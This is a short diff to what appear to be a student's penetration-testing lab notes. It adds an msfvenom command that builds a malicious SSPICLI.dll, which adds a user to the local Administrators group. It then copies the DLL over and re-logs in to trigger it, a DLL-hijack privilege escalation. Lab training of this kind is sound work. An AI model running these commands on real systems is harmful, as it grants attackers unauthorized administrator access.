@@ -113,6 +113,13 @@
 
 xfreerdp /u:comrade /v:0.0.0.0 /port:32302 /dynamic-resolution +glyph-cache +clipboard
 
+```
+msfvenom -p windows/exec CMD="cmd.exe /C net localgroup Administrators Lroth /add" -b '\x00' -f dll > SSPICLI.dll
+
+scp student@10.50.30.149:/home/student/10.50.37.194/SSPICLI.dll . 
+
+*log off and re-RDP
+```
 
 
 
